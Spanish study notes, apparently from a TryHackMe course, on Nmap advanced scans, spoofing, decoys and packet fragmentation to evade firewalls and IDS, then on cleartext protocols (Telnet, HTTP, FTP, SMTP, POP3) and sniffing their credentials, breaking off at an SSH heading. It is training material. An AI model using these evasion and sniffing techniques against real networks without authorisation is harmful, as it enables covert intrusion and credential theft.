	<img src="{{ 'assets/img/THM/Pasted image 20220825003624.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220825003640.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 4.5. Nmap Advanced Port Scans.

**Intro.**

En esta sección vamos a cubrir escáneres avanzados. Estos  se basan en la modificación de los *TCP Flags*.

<br />

**TCP Flags**

Nmap tiene multitud de escaneos TCP y para ser capaz de entender todos ellos debemos revisar la cabecera TCP de un paquete y examinar determinados componentes.

En primer lugar, la cabecera TCP son los primeros 24 bytes de un segmento TCP, en la siguiente figura se puede apreciar la cabecera TCP tal y como está definida en el documento por convenio [RFC 793](https://datatracker.ietf.org/doc/html/rfc793.html):

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220824183034.png' | relative_url }}" text-align="center"/>
</div>

Observamos que en esta cabecera existen campos (resaltados en rojo) que reciben el término de *TCP Flags* y en concreto nos interesan centrarnos en aquellos que Nmap puede configurar: 

- *URG*: Urgent Flag. Es una flag que se utiliza para indicar que el mensaje del paquete es urgente. Un segmento TCP con el URG flag activado es procesado inmediatamente independientemente de los segmentos que deban ser procesados antes.

- *ACK*: Acknowledgment flag, indica que el número de acknowlegment es significativo. 

- *PSH*: Push flag pide TCP pasar los datos a la aplicación con prontitud.

- *RST*: Reset flag, resetea la conexión. 

- *SYN*: Synchronize flag, inicia un TCP 3-way handshake. 

- *FIN*: Indicando que el emisor o tiene más datos que enviar. 

Pasamos ahora a explorar los diversos escaneos TCP que existen. Todos ellos basados en modificar el correspondiente TCP flag:

-   Null Scan.
-   FIN Scan.
-   Xmas Scan.
-   Maimon Scan.
-   ACK Scan.
-   Window Scan.
-   Custom Scan.

Además de otros:

-   Spoofing IP/MAC.
-   Decoy Scan.
-   Fragmented Packets.
-   Idle/Zombie Scan.

	<br />

**TCP Null, FIN, Xmas scan.**

- *TCP Null Scan*: El Null scan se caracteriza por setear todos los flags a 0. 

	Un puerto abierto no envía ninguna respuesta cuando recibe un NULL packet:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220825114729.png' | relative_url }}" text-align="center"/>
	</div>

	Un puerto cerrado devuelve un RST,ACK cuando recibe un NULL packet:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220825114758.png' | relative_url }}" text-align="center"/>
	</div>

	Por tanto, podemos emplear este escaneo para saber qué puertos no están cerrados, obteniendo en muchos casos la respuesta de *open|filtered* que recordamos es la incapacidad para saber si el puerto está abierto o es inalcanzable:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220825115136.png' | relative_url }}" text-align="center"/>
	</div>

	Por último, *necesitamos permisos de superusuario para realizar esta acción*.

	<br />

- *TCP FIN Scan*: El FIN scan es aquel que envía un paquete con la flag FIN a 1.

	Un puerto abierto no devuelve respuesta:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220825115910.png' | relative_url }}" text-align="center"/>
	</div>

	Un puerto cerrado devuelve un RST, ACK cuando recibe un FIN Packet:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220825120129.png' | relative_url }}" text-align="center"/>
	</div>

	De nuevo, tendríamos el mismo resultado que con el escaner anterior:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220825120156.png' | relative_url }}" text-align="center"/>
	</div>

	<br />

- *TCP Xmas Scan*: El Xmas setea a 1 los flags FIN, PSH y URG simultáneamente. De nuevo tenemos los mismos resultados que en los escaneres anteriores:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220825120913.png' | relative_url }}" text-align="center"/>
	</div>

	<br />

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220825120918.png' | relative_url }}" text-align="center"/>
	</div>

	<br />

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220825120944.png' | relative_url }}" text-align="center"/>
	</div>

	<br />

Un posible escenario donde estos tres tipos de escaneos son útiles es cuando se intenta escanear una máquina protegida bajo un firewall de lista negra que bloquea paquetes TCP SYN a ciertos puertos. Empleando una combinación de flags que no incluye el SYN se puede llegar a alacanzar la máquina que está detrás.

<br />

**TCP Maimon Scan**

Este escaneo envía un paquete con las TCP Flags FIN y ACK a 1. De forma que la respuesta de puerto, ya sea abierto o cerrado, debe ser un RST. Algunos sistemas desechan el paquete si el puerto está abierto pero no es habitual. 

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220825122146.png' | relative_url }}" text-align="center"/>
</div>

Este tipo de escaneo no suele detectar puertos abiertos: 

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220825122259.png' | relative_url }}" text-align="center"/>
</div>

Ya que no puede distinguir entre ambos estados. Es útil para saber si el host está activo o no.

<br />

**TCP ACK, Window, and Custom Scan**

- *TCP ACK Scan*: Este tipo de escaneo envía un paquete con el ACK flag seteado el cual provoca que se devuelva un RST independientemente de si el puerto está abierto o cerrado. 

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220825124345.png' | relative_url }}" text-align="center"/>
	</div>

	Por tanto, este tipo de escaneo no está orientado a descubrir el estado de los puertos, sin embargo, es útil para poder trazar las reglas de un firewall. Si este bloquea un escaneo TCP SYN pero no un TCP ACK significa que bloquea por reglas predefinidas y que quizá sea vulnerable a escaneos más sofisticados. 

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220825124712.png' | relative_url }}" text-align="center"/>
	</div>

	Recordamos que *unfiltered* significa que Nmap puede llegar al puerto pero no es capaz de discernir si está abierto o cerrado. Simplemente es accesible. 

	<br />

- *Window Scan*: El Windows Scan actúa de forma similar al ACK Scan salvo por el hecho de que examin el campo TCP Window del paquete respuesta RST. En algunos sistemas específicos esto puede servir para saber si el puerto está abierto o cerrado. Es una extensión del escaneo anterior que puede sernos, en determinadas circustancias, más útil.  

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220825134121.png' | relative_url }}" text-align="center"/>
	</div>

	De nuevo, es especialmente útil para experimentar con las reglas de un determinado firewall. Que un puerto esté bloqueado por un firewall no significa en primer lugar que este no ofrezca un servicio y que no sea accesible de otras maneras. 
	
	<br />

- *Custom Scan*: El Custom Scan es aquel en el que se setean las flags que el usuario ejecutante del comando quiera mediante el modificador: --scanflags. Por ejemplo: --scanflags RSTSYNFIN

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220825134415.png' | relative_url }}" text-align="center"/>
	</div>

	<br />

**Spoofing and Decoys**

- *IP Spoofing*: En primer lugar, el IP Spoofing es una técnica con la que se consigue cambiar la dirección IP del emisor de un paquete a los ojos del receptor (destinatario) del mismo. Técnicamente, consiste en modificar el contenido de *IP header* cambiando el campo *source*. 

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220825223705.png' | relative_url }}" text-align="center"/>
	</div>
	
	Esto lo podemos hacer con Nmap empleando el comando:
	
	```bash
	nmap -S <SPOOFED_IP> <MACHINE_IP>
	```
	
	Cuando realizamos esta operación es importante entender que al cambiar la fuente, cambia el destino de la respuesta de la máquina con la que interactuamos:
	
	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220825224147.png' | relative_url }}" text-align="center"/>
	</div>
	
	Por tanto, debemos asegurarnos de que podemos recibir o interceptar el output al escanear utilizando esta técnica ya que este no será devuelto a la auténtica fuente emisora. 
	
	Esto sería una descripción técnica pero en términos prácticos debemos tener en cuenta los siguientes puntos:
	
	- Debemos especificar la interfaz de red con el modificador "*-e*".
	- Debemos deshabilitar el escaneo ping previo al escaneo de puertos con "*-Pn*".
	
	De esta forma, el comando quedaría redefinido como sigue:
	
	```bash
	nmap -e <NET_INTERFACE> -Pn -S <SPOOFED_IP> <MACHINE_IP>
	```

	<br />
	
- *MAC Spoofing*: El MAC Spoofing consiste en el enmascaramiento de la dirección cambio del Media Access Control, número que sirve a modo de identificador físico de un dispositivo en una red (concretamente en una red local o una subred).


	Esto técnicamente se consigue modificando el contenido del *Address field* del *header* del *data link layer frame* en el paquete TCP/IP:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220825231716.png' | relative_url }}" text-align="center"/>
	</div>

	<br />

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220825231640.png' | relative_url }}" text-align="center"/>
	</div>

	Conviene observar que *esto sólo es posible si se está en la misma subred que el objetivo*. Podemos realizar el MAC Spoofing con el modificador: --spoof-mac \<SPOOFED MAC> añadiéndolo sobre un comando de Nmap. 

	<br />
	
- *Decoys*: La principal desventaja del IP/MAC Spoofing es que sólo funciona en un número limitado de casos en los que se dan unas condiciones concretas. Es más práctico utilizar "Decoys" (señuelos) para conseguir que sea más difícil identificarte. 

	Esto fundamentalmente consiste en emplear varios IP/MAC Spoofings para camfuflar el origen del escaneo entre diversas IPs incluyéndo la original. Esto tiene la ventaja de conseguir el efecto del spoofing convencional sin el handicap de no obtener de vuelta los resultados del escaner ya que la dirección del atacante se incluye entre las direcciones del Decoy:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220826095205.png' | relative_url }}" text-align="center"/>
	</div>

	Podemos emplear esta técnica con Nmap mediante el uso del modificador  *-D*, por ejemplo:

	```bash
	nmap -D 10.10.0.1,10.10.0.2,ME <MACHINE_IP>
	```

	Las dos primeras IPs son el señuelo y tras el ME añadimos la IP original. También podemos emplear el término RND para asignar una IP señuelo de forma aleatoria:

	```bash
	nmap -D 10.10.0.1,RND,ME <MACHINE_IP>
	```

	<br />

**Firewall.IDS.Fragmented Packets.**

En primer lugar, un *firewall* es un software que regula tráfico de red a través de reglas predefinidas por un administrador. Por otro lado, un IDS son las siglas que corresponden a Intrusion Detection System, se trata de un tipo de software gestionado de nuevo mediante reglas predefinidas que inspecciona paquetes de red en busca de patrones o contenido que se ajuste a las reglas desplegando una alerta con cada coincidencia.

Ahora vamos a ver una característica que Nmap posee para evitar la seguridad de los dos softwares anteriores, es la característica de la *fragmentación de paquetes*.

Recordamos que el *data* del *IP Header* no es más que el resto del contenido del paquete TCP/IP fuera del IP Header:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220826184301.png' | relative_url }}" text-align="center"/>
</div>

mediante los modificadores *-f* y *-ff* (o *-f* *-f*) partimos el data del IP header en respectivamente fragmentos de 8 y 16 bytes.

Un ejemplo sería:

```bash
sudo nmap -sS -p80 -f 10.20.30.144
```

En esta comando estamos pidiendo un escaneo TCP SYN al puerto 80 de la IP 10.20.30.144 pero además, estamos pidiendo que se fragmenten los datos, si no lo hiciéramos obtendríamos la tranismisión del paquete tal cual:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220826194440.png' | relative_url }}" text-align="center"/>
</div>

Pero al hacerlo podemos observar la transferencia de dos paquetes IP fragmentados:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220826194505.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, al fragmentar los paquetes podemos romper el contenido o patrón que podría desencadenar una coincidencia o una alerta, haciéndo así más dificíl la detección de un escaneo de Nmap por parte de un firewall o un IDS.

<br />

**Reason**

Podemos instar a Nmap a que se explaye más por las razones por las que ha obtenido los resultados que ha obtenido en un escaneo mediante los siguientes modificadores:

- *-vv*: Double verbose.

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220826195312.png' | relative_url }}" text-align="center"/>
	</div>
	
- *--reason*: Aporta razones sobre los resultados obtenidos.

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220826195345.png' | relative_url }}" text-align="center"/>
	</div>

- *-d / -dd*: Debugin.

	<br />

**CheatSheet**

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220826195712.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220826195725.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220826195737.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 4.6. Nmap Post Port Scans.

**Intro**

Llegados a este punto, hemos llevado a cabo una enumeración del objetivo, hemos evaluado qué hosts están levantados y sobre esos hosts hemos escaneado todos sus puertos en busca de puertos abiertos que ofrezcan servicios activamente.

Ahora, toca pasar sobre la etapa de recopilación de información de dicho servicio hospedado en un determinado puerto con Nmap.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220826235412.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Service Detection**

Una vez hemos escaneado los puertos de un host activo, podemos emplear Nmap para tratar de obtener información de la versión de la aplicación que gestiona dicho servicio.

Para ello, utilizamos el modificador *-sV* a un comando de escaneo de puertos sobre un host para obtener información de la versión de la aplicación que escucha en dicho puerto. Además, podemos controlar la intensidad de esta recopilación con *--version-intensity LEVEL* que tiene nueve niveles, 0 para el más bajo y 9 para el más alto. 

```bash
nmap -sV --version-intensity <LEVEL> <MACHINE-IP>
```

Es importante recordar que:

- *-sV forzará a Nmap a utilizar el TCP Connect Scan que completa el TCP 3-Way Handshake*, ya que posteriormente va a proceder a realizar una extracción de información mediante diversas peticiones.

- *No se puede llevar a cabo este escaneo sin permisos de súperusuario*.

Así, el output sería:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220827094243.png' | relative_url }}" text-align="center"/>
</div>

<br />

**OS Detection and Traceroute**

Nmap también puede detectar el sistema operativo que se ejecuta en el host que escanea con la opción *-O*, por ejemplo:

```bash
nmap -sS -O <MACHINE-IP>
```

Y el output sería:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220827095612.png' | relative_url }}" text-align="center"/>
</div>

Observemos que en la parte inferior ofrece detalles del sistema operativo, como el tipo, versión, [CPE](https://nmap.org/book/output-formats-cpe.html) (Common Platform Enumeration).

<br />

Por otro lado, *--traceroute* es un modificador que incita a Nmap a descubrir (con un procedimiento equivalente al empleado por el comando de bash, traceroute) routers entre la máquina local y el host. 

```bash
nmap -sS --traceroute 10.10.227.58
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220827101421.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Nmap Scripting Engine (NSE)**

Denominamos como *script* a una pieza de código que no necesita ser compilada para ser procesada. Nmap admite scripts escritos en Lua que pueden ser llamados mediante los modificadores *--script=\<path/to/script>* o *-sC*.

Existen diversas categorías de scripts:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220827103148.png' | relative_url }}" text-align="center"/>
</div>

Por ejemplo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220827103236.png' | relative_url }}" text-align="center"/>
</div>

Todos estos scripts se pueden acceder desde /usr/share/nmap/scripts y accediendo al contenido de estos se puede obtener una somera descripción del uso de los mismos. Para más información [aquí](https://nmap.org/book/man-nse.html)

<br />

**Saving the Output**

Cuando se realiza un escaneo con Nmap, es posible y deseable guardarlo en un fichero para su posterior escrutinio. Hay tres tipos de formatos:

- Normal: -oN \<FILENAME>
- Grepable: -oG \<FILENAME> Este es un tipo de fichero adecuado para ser utilizado con el comando *grep*.
- XML: -oX \<FILENAME> Para guardarlo en formato XML, no es ideal para examinarlo posteriormente, pero si lo es para introducir los resultados de un escaneo en otros programas de, por ejemplo, escaneo de vulnerabilidades (Nessus) o explotación (Metasploit). 

	<br />

#### 4.7. Protocolos and Servers. 

**Intro**

Vamos a revisar en esta sección algunos protocolos de aplicación y servicios de red. 

Estos protocolos de la capa de aplicación pertenecen a dicha capa porque definen cómo se comporta una aplicación que ofrece un servicio de red.

<br />

**Telnet**

El protocolo Telnet es un protocolo de la capa de aplicación que es un acrónimo de TELetype NETwork y que se emplea para proveer un servicio de administración remota entre dispositivos entre otras cosas. 

Por otra parte, está el servicio de red Telnet, proporcionado generalmente por la aplicación Telnet, que emplea el protocolo Telnet para ofrecer un servicio de administración remota. Esto se lleva a cabo en los siguientes pasos:

- En primer lugar, la aplicación cliente de Telnet efectúa una conexión al servidor Telnet de una máquina remota sobre el puerto 23.
- Este servidor pide credenciales de autenticación.
- Si estas credenciales son correctas, el servidor despliega una terminal de administración remota sobre el cliente. 

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220828174225.png' | relative_url }}" text-align="center"/>
</div>

Este servicio NO ESTÁ CIFRADO, con lo que la información se transmite "en claro" y puede ser interceptada y espiada desde una aplicación como por ejemplo Wireshark:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220828174318.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Hypertext Transfer Protocol (HTTP)**

El protocolo HTTP es un protoolo de la capa de aplicación empleado por las aplicaciones que ofrecen servicio web. Esto es, para que tu navegador renderice una página web, antes debe conectarse a un servidor web y mediante HTTP lleva a cabo requests (basados en directivas que el usuario instruye a través de la URL) sobre el servidor que devuelve HTTP responses que contienen documentos HTML que el primero termina por renderizar. 

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220828175344.png' | relative_url }}" text-align="center"/>
</div>

HTTP envía y recibe datos en texto claro (no cifrado); por lo tanto, podemos usar una herramienta simple, como Telnet (o Netcat), para conectarnos con un servidor web y actuar como un "navegador web". La diferencia es que debemos escribir comandos relacionados con HTTP en lugar de dejar que el navegador lo haga por nosotros.

- En primer lugar, utilizamos Telnet para conectarnos a una IP sobre el puerto 80:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220828182135.png' | relative_url }}" text-align="center"/>
	</div>
	
- Seguidamente, envíamos un GET sobre el index.html y recibimos la respuesta HTTP con el documento HTML: 

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220828182152.png' | relative_url }}" text-align="center"/>
	</div>

Algunos de los servidores web más comunes son:

-   [Apache](https://www.apache.org/)
-   [Internet Information Services (IIS)](https://www.iis.net/)
-   [nginx](https://nginx.org/)

	<br />
	
**File Transfer Protocol (FTP)**

FTP son las siglas de File Transfer Protocol (Protocolo de Transferencia de Ficheros) creado para compartir ficheros entre dispositivos. Hemos tratado con anterioridad este protocolo.

Sin embargo, en este apartado vamos a aprovecharnos que el protocolo FTP no está cifrado para ver cómo podemos interactúar con un servidor FTP mediante el cliente de Telnet. 

- En primer lugar, nos conectamos con el cliente de telnet al puerto donde escuche el servidor FTP que generalmente se trata del puerto 21. 
- Seguidamente, el servidor FTP nos solicitará unas credenciales, en ocasiones podremos encontrar que algunso servidores FTP poseen un usuario sin contraseña: Anonymous. 
- Una vez proporcionadas las credenciales y si estas son correctas, nos logearemos y tendremos acceso a ciertos contenidos del servidor FTP.

Por ejemplo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220828184854.png' | relative_url }}" text-align="center"/>
</div>

No podemos transferir transferir binarios ya que FTP emplea dos canales de conexión, el primero es el canal de control que envía instrucciones al servidor, este devuelve el output del comando a través de un segundo canal que es el canal de data:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220828190514.png' | relative_url }}" text-align="center"/>
</div>

Así, necesitaríamos con Telnet generar un segundo canal empleando el modo pasivo, más detalles en el challenge de Nwetworking más abajo. 

Sin embargo, todavía podemos ejecutar comandos. En este caso, después de logearnos, hemos ejecutado los siguientes comandos:

- *SYST*: Enseña el tipo de sistema, en este caso UNIX type. 
- *PASV*: Cambia a modo pasivo, existen dos modos en los que FTP opera:
	- *Active*: En el modo activo, el canal de envío de información se origina porque el servidor FTP se conecta al cliente.
	- *Passive*: En el modo pasivo, el canal de envío de información se origina mediante una nueva conexión del cliente a otro puerto del servidor. Más detalles en el challenge final de Networking.
- *TYPE A*: Cambia la transferencia de ficheros al modo ASCII. 
- *STAT*: Ofrece información breve sobre el sistema. 
- *QUIT*: Quita el programa.

Para descargar ficheros de un servidor FTP, deberíamos emplear un cliente específicamente preparado para ello  como el cliente FTP:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220828190625.png' | relative_url }}" text-align="center"/>
</div>

O crear un segundo canal con Telnet, lo cual está específicado en challenge de Network más abajo. 

Algunos de los servidores FTP más comunes son:

-   [vsftpd](https://security.appspot.com/vsftpd.html)
-   [ProFTPD](http://www.proftpd.org/)
-   [uFTP](https://www.uftpserver.com/)

Algunos de los clientes más comunes de FTP son:

- FTP.
- FileZilla.

	<br />

**SMTP**

SMTP responde a Simple Mail Transfer Protocol y es un protocolo de la capa de aplicación empleado por aplicaciones que ofrecen un servicio de mensajería mail a través de internet. 

Antes que nada, para que dos dispositivos intercambien emails hacen falta los siguientes componentes:

- *MUA*: Mail User Agent. Cliente que quiere enviar un email.
- *MSA*: Mail Submision Agent. Aplicación que revisa errores.
- *MTA*: Mail Transfer Agent. Aplicación que transfiere el mail al recipiente del destinatario.
- *MDA*: Mail Delivery Agent. Aplicación que recibe el mail y lo procesa a la espera de que lo descarge y lea.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220828213108.png' | relative_url }}" text-align="center"/>
</div>

<br />

De esta forma, la relación descrita en la imagen anterior tiene la siguiente descripción:

1. El MUA (User Agent o cliente) posee un mail que quiere enviar y se pone en contancto con el MSA (Submission Agent).
2. El MSA realiza un checkeo de errores y seguidamente se le envía al MTA (Transfer Agent).
3. El MTA envía el mensaje al recipiente del destinatario.
4. El MDA recibe y procesa el mail hasta que el destinatario lo descarga y lo lee. 
5. El MUA del servidor revisa cada poco tiempo el recipiente y cuando detecta un nuevo email lo descarga y spamea una alerta.

*El resúmen es que desde un host se sube un mail a un servidor (1,2) que lo transporta a otro servidor (3,4) desde el cual el destinatario del mail se lo descarga y lee (5).*

De esta forma, el protocolo que emplean todos estos agentes para comunicarse es SMTP y POP3/IMAP. En esta sección nos centraremos en el protocolo SMTP.

Concretamente, Simple Mail Transfer Protocol (SMTP) es utilizado por el MUA (User Agent) para comunicarse con el MSA (Submission Agent), sobre el puerto 25 generalmente y entre MTAs para transferir mails entre servidores. 

De nuevo, como SMTP no se cifra, podemos emplear Telnet para conectarnos a un servidor MSA e introducir comandos SMTP como si fuéramos un MUA mandando un mensaje.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220829004822.png' | relative_url }}" text-align="center"/>
</div>

En la imagen anterior se puede observer que empleamos Telnet para conectarnos al puerto 25 de una máquina remota. Seguidamente 
seguimos los siguientes pasos para transferir un email al servidor:

- En primer lugar, escribimos: *helo \<HOSTNAME>*.
- Seguidamente, *mail from \<EMISOR>*, *rcpt to: \<RECIPIENTE>*
- Por último, *data* y escribimos nuestro mensaje y pulsamos Enter. 

	<br />

**POP3**

Post Office Protocol version 3 (POP3) es un protocolo complementario a SMTP, es la otra cara de la moneda junto con IMAP ya que es utilizado por el MUA (User Agent) para descargar mails disponibles desde el MDA server (Delivery Agent)

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220829090441.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, para el User Agent hay dos funcionalidades:

- (1 -> 2) Envío de mails para lo cual emplea SMTP desde MUA al MSA server y entre MTAs.
- (4 -> 5) Descarga de mails recibidos para lo cual se emplea POP3/IMAP desde MUA al MDA server.

De nuevo, POP3 no está cifrado y podemos utilizar Telnet para conectarnos a un MDA server gestionado por POP3 que generalmente escucha en el puerto 110:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220829100328.png' | relative_url }}" text-align="center"/>
</div>

En la imagen anterior podemos ver como se conecta al servidor POP3 y este le pide las credenciales. Al autenticarse le informa de que tiene un mensaje nuevo, ejecuta el comando STAT para ver la totalidad de los mensajes, LIST para ver nuevos mensajes y obtenemos que hay uno. Para leerlo utilizamos el comando RETR \<NUMBER> y QUIT para quitar el programa. 

En general, el cliente de correo (MUA) se conectará al servidor POP3 (MDA), autenticará y descargará los mensajes. Aunque la comunicación que utiliza el protocolo POP3 se ocultará detrás de una interfaz elegante, por debajo se emiten comandos similares, como se muestra en la sesión de Telnet anterior.

<br />

**IMAP**

El Protocolo de acceso a mensajes de Internet (IMAP) es más sofisticado que POP3. IMAP hace posible mantener su correo electrónico sincronizado en múltiples dispositivos (y clientes de correo). En otras palabras, si marca un mensaje de correo electrónico como leído cuando revisa su correo electrónico en su teléfono inteligente, el cambio se guardará en el servidor IMAP (MDA) y se replicará en su computadora portátil cuando sincronice su bandeja de entrada. Escucha en el puerto 143.

<br />

**CheatSheet Port**

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220829102722.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 4.8. Protocols and Servers II.

Antes hemos presentado los protocolos más habituales encontrados en servidores. En esta sección vamos a presentar los métodos de ataques a los que estos servicios más expuestos están, entre los que se incluyen:

1. *Sniffing Attack (Network Packet Capture)*.
2. *Man-In-The-Middle (MITM) Attack*.
3. *Password Attack (Authentication Attack)*.
4. *Vulnerabilities*.

También conviene recordar que, desde el punto de vista de la seguridad los actos deben ir dirigidos a mantener la Confidencialidad, Integridad y Disponibilidad de los datos, desde el punto de vista del atacante, los actos van dirigidos a la Difusión, Alteración y Destrucción de los datos.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220829154505.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Sniffing Attack**

El ataque *Sniffing Attack* consiste en utilizar una herramienta de captura de paquetes para recolectar información sobre el objetivo que intercambia información en texto claro con otro dispositivo. Esto puede llevar a la fuga de mensajes privados o credenciales. 

Entre las herramientas más empleadas están:

1. *Tcpdump*: Un free open source CLI (Command Line-Interface).
2. *Wireshark*: Un free open source GUI (Graphical User-Interface).
3. *Tshark*: Un CLI que actúa como alternativa de Wireshark.

Veámos un ejemplo de cómo utilizar *Tcpdump* para interceptar tráfico mail procedente del protocolo POP3. 

En primer lugar, debemos tener acceso al canal de tráfico de red mediante un "wiretap" (Wiretapping *consiste en el acto de grabar las comunicaciones entre las partes, a menudo sin su consentimiento*) o un *switch with port mirroring* (El Port Mirroring es una técnica que se utiliza en un switch de red o en un router para enviar una copia de los paquetes de red previstos en los puertos especificados a otros puertos especificados) o un *Man-In-The-Middle*, el cual emplea una treta para confundir al emisor de la información para que mande la misma a un tercero y ese tercero la reenvía al autentico destinatario:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220829171907.png' | relative_url }}" text-align="center"/>
</div>

Una vez tenemos acceso al tráfico de red, supuestamente lo que ocurre es que la información pasa por nuestro ordenador:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220829165255.png' | relative_url }}" text-align="center"/>
</div>

Concretamente, al asaltar información transmitida mediante POP3, lo que ocurre es que la información se envía al puerto 110 de nuestra máquina por lo que procedemos a hacer un *tcpdump* sobre el puerto 110 con el modificador -A para especificar que el dump debe ser en ASCII.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220829170304.png' | relative_url }}" text-align="center"/>
</div>

Podemos ver que eventualmente aparecen las credenciales. 

También podemos emplear Wireshark filtrando la intercepción de toda la comunicación por el término "pop":

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220829170721.png' | relative_url }}" text-align="center"/>
</div>

Observemos que este tipo de ataque no funciona si el protocolo posee pautas de cifrado antes de enviar la comunicación.

<br />

**TLS**

Los protocolos de la capa de aplicación (Layer 7) cubiertos hasta ahora envían los datos en texto claro, esto hace posible que cualquier persona con acceso a la red capture, guarde y analice los mensajes intercambiados. Para solucionar esta debilidad, podemos agregar cifrado a los datos envíados a través de nuestros protocolos de la capa de aplicación a través de la capa de presentación (Layer 6). En consecuencia, los datos viajarían cifrados y nadie que los interceptase podría leerlos. Los protocolos de cifrado son SSL y TSL.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220829172924.png' | relative_url }}" text-align="center"/>
</div>

Se pueden emplear cualquiera de los dos pero lo importante es que a partir de esta modificación surgieron aplicaciones que ofrecían servicios a través de los protocolos anteriormente mencionados en combinación con protocolos de cifrado de la capa de presentación:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220829175145.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, mientras los antiguos protocolos abrían una sesión tras establecer una conexión TCP satisfactoria, estos nuevos protocolos seguros añaden un nuevo paso a la apertura de una sesión que consiste en establecer una conexión SSL/TSL después de la conexión TCP:

1. Establecer conexión TCP.
2. Establecer conexión TSL/SSL.
3. Apertura de sesión FTP, HTTP, etc. 

Esta conexión se denomina *SSL/TSL Handshake* que se configura acorde con el [RFC 6101](https://datatracker.ietf.org/doc/html/rfc6101) por ejemplo, el SSL Handshake se produciría así:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220829180903.png' | relative_url }}" text-align="center"/>
</div>

1. El cliente envía un "ClientHello" al servidor para indicar sus capacidades, como los algoritmos que el cliente admite.
2. El servidor responde con un "ServerHello", indicando los parámetros de conexión seleccionados de entre los admitidos por el cliente y proporciona su certificado si se requiere la autenticación del servidor. El certificado es un archivo digital para identificarse; por lo general, está firmado digitalmente por un tercero. Además, podría enviar información adicional necesaria para generar la clave maestra, en su mensaje ServerKeyExchange, antes de enviar el mensaje ServerHelloDone para indicar que ha terminado con la negociación.
3. El cliente responde con un ClientKeyExchange, que contiene información adicional necesaria para generar la clave maestra. Además, cambia para usar cifrado e informa al servidor mediante el mensaje ChangeCipherSpec.
4. El servidor también cambia para usar el cifrado e informa al cliente en el mensaje ChangeCipherSpec.

	<br />

**SSH. SCP.**

